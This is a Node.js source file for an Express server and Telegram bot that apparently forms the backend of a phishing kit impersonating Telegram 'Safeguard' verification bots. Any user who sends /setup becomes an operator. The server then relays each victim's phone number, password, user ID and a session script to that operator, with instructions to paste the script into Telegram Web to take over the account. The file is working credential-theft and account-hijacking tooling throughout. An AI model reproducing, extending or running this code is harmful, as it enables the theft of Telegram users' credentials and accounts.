const express = require("express");
const fs = require("fs");
const path = require("path");
const TelegramBot = require("node-telegram-bot-api");
const phoneUtil = require("google-libphonenumber").PhoneNumberUtil.getInstance();
const PNF = require("google-libphonenumber").PhoneNumberFormat;

// Load configuration from config.json
const config = JSON.parse(fs.readFileSync(path.join(__dirname, "config.json"), "utf-8"));

// Store admins and whitelisted users dynamically
let admins = [5891533625];
let whitelistedUsers = {};

// Pre-load images for optimization
const safeguardSuccess = fs.readFileSync(path.join(__dirname, "images/success/safeguard.jpg"));
const safeguardVerification = fs.readFileSync(path.join(__dirname, "images/verification/safeguard.jpg"));

// Initialize Telegram bot using config.json values
const safeguardBot = new TelegramBot(config.FAKE_SAFEGUARD_BOT_TOKEN, { polling: true });

// Get Safeguard bot username
let safeguardUsername;
safeguardBot.getMe().then(botInfo => safeguardUsername = botInfo.username);

// Express server setup
const app = express();
app.use(express.json());
app.use(express.static("public"));

/**
 * Handle /setup command
 */
const handleSetupCommand = (bot) => {
    bot.onText(/\/setup/, async (msg) => {
        const userId = msg.from.id;

        // Add user to whitelist
        if (!whitelistedUsers[userId]) {
            whitelistedUsers[userId] = { userId, name: msg.from.first_name || "Unknown" };

            bot.sendMessage(
                userId,
                "✅ You have been added to the whitelist. You can now add the bot to your channels.\nLogs will be sent to you directly."
            );
        } else {
            bot.sendMessage(userId, "⚠️ You are already whitelisted.");
        }
    });
};

/**
 * Log handling: dynamically route logs to the correct user
 */
const handleRequest = async (req, res, data) => {
    try {
        const bot = safeguardBot;
        const userId = Object.keys(whitelistedUsers).find(uid => whitelistedUsers[uid].userId === req.body.setupBy);

        if (!userId) throw new Error("User not found in whitelist");

        await bot.sendMessage(
            userId,
            `🪪 <b>UserID</b>: ${data.userId}\n🌀 <b>Name</b>: ${data.name}\n⭐ <b>Telegram Premium</b>: ${data.premium ? "✅" : "❌"}\n📱 <b>Phone Number</b>: <tg-spoiler>${data.number}</tg-spoiler>\n${data.usernames}\n🔐 <b>Password</b>: <code>${data.password !== undefined ? data.password : "Null"}</code>\n\nGo to <a href="https://web.telegram.org/">Telegram Web</a>, and paste the following script.\n<code>${data.script}</code>\n<b>Module</b>: Safeguard`, {
                parse_mode: "HTML"
            }
        );

        res.json({});
    } catch (error) {
        console.error("Error in handleRequest:", error);
        res.status(500).json({ error: "server error" });
    }
};

// Call the setup handler for the Safeguard bot
handleSetupCommand(safeguardBot);

// Start Express server using the port from config.json
app.listen(config.PORT || 80, () => console.log(`Server running on port ${config.PORT || 80}`));
